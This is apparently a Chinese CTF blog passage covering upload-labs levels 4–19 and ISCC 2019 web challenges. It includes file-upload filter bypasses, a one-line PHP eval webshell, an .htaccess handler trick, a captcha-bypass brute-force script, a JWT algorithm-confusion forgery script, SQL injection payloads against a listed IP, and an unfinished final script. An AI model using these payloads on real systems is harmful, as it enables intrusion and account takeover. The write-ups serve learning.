本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单就比较完善了，过滤了各种罕见后缀，但是没有过滤.htaccess 我们在.htaccess文件上写： SetHandler application/x-httpd-php 意思就是把本目录下的jpeg文件当做php来解析 新建一个jpg文件，内容如下： &lt;?php @eval($_GET[&#39;chuddy&#39;]); ?&gt; 然后访问上传文件的存储位置，可以发现能够被解析为php文件。 Pass-05$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单比前面的关卡更加完善了。过滤了.htaccess，但是代码中后缀转换为小写被去掉了，因此我们可以上传Php来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写) Pass-06查看提示发现同样是黑名店限制，几乎涵盖了所有危险的后缀，那么查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } win下的小技巧：Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可绕过。 Pass-07$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 此处会删除末尾的空格，但是没有去掉末尾的点，因此上传一个.php.文件即可绕过。 Pass-08$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 发现缺少::$DATA 查阅资料发现，这是利用windows操作系统的一个特性： NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。上传.php::$DATA绕过。(仅限windows) Pass-09is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过阅读源码，我们可以发现,用户上传的文件名，我们可控。且会删除文件名末尾的点和空格 结合上面几关的解题经验，我们可以发现可以通过创建文件.php.空格.来进行绕过 Pass-10$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $file_name)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; $is_upload = true; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过查看源码发现 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 将黑名单的文件名替换成空，所以我们想到可以通过双写来进行绕过。 Pass-11$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &#39;上传失败！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7exp：move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\\x00.jpg&quot;); 源码中move_uploaded_file中的save_path可控，因此00截断即可。 Pass-12方法同上，只是请求方式改为POST Pass-13提示 本pass检查图标内容开头2个字节！ 我们可以伪造一下文件头的信息 常用文件头： （1） .JPEG;.JPE;.JPG，”JPGGraphic File” （2） .gif，”GIF 89A” （3） .zip，”Zip Compressed” （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” Pass-14本关可以通过制作图片马进行绕过 制作图片马的方法： 在Windows的cmd中执行命令： copy 图片名/b+ 木马文件/a 合成的图片马名 Pass-15同14关 Pass-16主要是二次渲染绕过 jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。 二次渲染的详解 Pass-17$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传失败！&#39;; } } 可以看到文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件。 一边用bp一直上传木马文件，一边用脚本一直访问该临时文件，就能成功执行命令。 Pass-18原理同17一样，都是利用条件竞争 Pass-19$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) { $is_upload = true; }else{ $msg = &#39;上传失败！&#39;; } }else{ $msg = &#39;禁止保存为该类型文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这里需要注意的是move_uploaded_file会忽略掉文件末尾的/.这里是用户可控的。所以我们可以伪造这样的上传 总结感觉这个图总结的特别详细。 自己还是很菜，还要继续努力呀！","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019ISCC wp","slug":"2019ISCC-wp","date":"2019-05-27T11:55:01.000Z","updated":"2019-05-29T12:42:23.268Z","comments":true,"path":"2019/05/27/2019ISCC-wp/","link":"","permalink":"http://yoursite.com/2019/05/27/2019ISCC-wp/","excerpt":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下","text":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下 webweb4地址：http://39.100.83.188:8066/打开题目：发现直接显示源码，于是审计一波： &lt;?php error_reporting(0); include(&quot;flag.php&quot;); $hashed_key = &#39;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#39;; $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } if($action===&quot;auth&quot;){ $key = $_GET[&quot;key&quot;]; $hashed_input = hash(&#39;sha256&#39;, $key); if($hashed_input!==$hashed_key){ die(&quot;&lt;img src=&#39;cxk.jpg&#39;&gt;&quot;); } echo $flag; } }else{ show_source(__FILE__); }?&gt; 代码审计一波：发现了当传入的参数中 action 为auth，并且key和hashed_key 相等时，就给出 flag。 但是通过关键代码的分析 发现了存在变量覆盖的可能 $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } 函数parse_url和函数parse_str的配合使用可以实现变量覆盖 parse_url函数 parse_str函数作用 我们可以覆盖$hashed_key的值,为我们所控制的， &lt;?php $hashed_input = hash(&#39;sha256&#39;, &#39;chuddy&#39;); echo $hashed_input; ?&gt; 输出为：2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e 于是构建payload： http://39.100.83.188:8066/?action=auth&amp;hashed_key=2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e&amp;key=chuddy 就可以得到flag web2打开题目： 感觉像是暴力破解但是因为存在验证码，所以需要想办法绕过验证码的限制。 查看源码发现，该题目是通过php来写的验证码页面，猜测验证码的正确值可能会存在session当中。如果我们把session值删除，那么存在里面的验证码也就不存在了，再将传递的user_code的值设置为空就可以绕过验证码， 脚本： #coding=utf-8 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data = { &#39;Cookie&#39;: &#39;&#39; } url=&#39;http://39.100.83.188:8002/login.php&#39; for x in xrange(0,10): for a in xrange(0,10): for i in xrange(0,10): data={ &#39;username&#39;:&#39;admin&#39;, &#39;pwd&#39;: str(x)+str(a)+str(i), &#39;user_code&#39;:&#39;&#39;, &#39;submit&#39;:&#39;submit&#39; } res=requests.post(url,data=data) print str(x)+str(a)+str(i) if &quot;å¯ç éè¯¯&quot; not in res.text: print str(x)+str(a)+str(i) print res.text break 得到flag 以及密码996 web1打开题目： &lt;?php error_reporting(0); require &#39;flag.php&#39;; $value = $_GET[&#39;value&#39;]; $password = $_GET[&#39;password&#39;]; $username = &#39;&#39;; for ($i = 0; $i &lt; count($value); ++$i) { if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) { echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL; echo $flag, &#39;&lt;hr&gt;&#39;; } } highlight_file(__FILE__); 代码审计一下：从get传参获取两个变量值value和password value为一个数组，其中里面只能为数组 如果在32和127之间就会被unset处理，其他的会转字符串存入用户名中，然后判断用户名是否为 w3lc0me_To_ISCC2019，再判断用 intval 之后的 password 是否小于 2333， intval 之后的 password + 1 是否大于 2333。 php的chr函数会对传入的值和256取模，于是我们可以传递一个比原来大256的数来进行绕过 可以写个脚本生成payload： stra = &#39;w3lc0me_To_ISCC2019&#39; j=0 value = [] for i in stra: value.append(ord(i)+256) str1 = &quot;&quot; for i in range(len(value)): str1 += &quot;value[&quot;+str(i)+&quot;]=&quot;+str(value[i])+&quot;&amp;&quot; print str1 value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313 至于password参数可以对其进行16进制编码绕过或者科学记数法绕过。 最终payload为： http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=1e9 即可得到flag。 web3sqli-labs上的一个原题利用到了二次注入。 打开页面发现需要注册账号进行登陆：于是随便注册一个账号登陆进去发现存在修改密码的功能，于是想到了二次注入。 注册一个用户名为admin&#39;--的账号登陆之后更改密码后台的sql语句可能为：update users set password=’1234561 where username=’admin’– ‘ 就可以修改管理员的账号密码了，进行登陆管理员的账号就得到了flag web6这是一道原题 参考了一叶飘零大佬写的文章文章地址 打开页面登陆进去，没什么思路，于是抓包看了一下： 发现了jwt的代码 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiY2h1ZGR5IiwicHJpdiI6Im90aGVyIn0.VbwW1bhJ4555jrZw4PJeo1_h3QVQ3M0pUCeSkhu4Y6Z5JL8sSgVBL2Z6EeNDMBWBHy_Ps1WNPVeW1grFE4oH6n3dl7Qh8qsvFbqM3FMmNUwSaQhbjycLMVgHHwq2BbRG0qZoX9G8Fyr-uSLfxK9N18vOcKMirHpju0-qpVOR5gU 于是尝试解码： 通过查看源代码 发现/static/js/common.js后面有一段代码 function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ } 尝试构造一个访问，查了我的用户名加密码的MD5值为：68c623464e8a37ddeb9632fb3ccbe82f 访问 /pubkey/68c623464e8a37ddeb9632fb3ccbe82f发现： 内容为： -----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY----- 将这个文件存入txt文件内： -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc IC+LX+9V/mpyKe9R3wIDAQAB -----END PUBLIC KEY----- 那么我们来尝试更改一下 alg 所指代的算法，将其从 RS256 这种非对称加密改成 HS256 这种对称加密，这样我们有公钥就可以伪造 JWT Token 从而为所欲为了。用 Python 脚本来伪造令牌，payload 部分填写自己想要的内容。 import jwt import base64 public = open(&#39;2.txt&#39;, &#39;r&#39;).read() print jwt.encode({&quot;name&quot;: &quot;chuddy&quot;,&quot;priv&quot;: &quot;admin&quot;}, key=public, algorithm=&#39;HS256&#39;) 运行发现报错了。直接去库源码里面把报错的那一段注释掉。简单粗暴 再次运行就会得到JWT TOKEN了 然后抓包更改session： 得到了admin的留言地址，访问就会得到flag web5打开链接发现： 猜测是修改header头来进行绕过的，经过尝试发现添加 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373 提示我要输入用户名：于是post传递username=chuddy 又提示我需要输入密码：于是post传递password=chuddy 得到 通过尝试得到了用户名union_373_Tom 这道题过滤了好多敏感字符串，尝试了一下发现可以通过order by注入得到密码 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;1&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，2! 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;2&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，union_373_Tom! 于是可以尝试使用脚本来跑： #coding=utf-8 import requests head = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373&#39; } url=&#39;http://39.100.83.188:8054/&#39; # 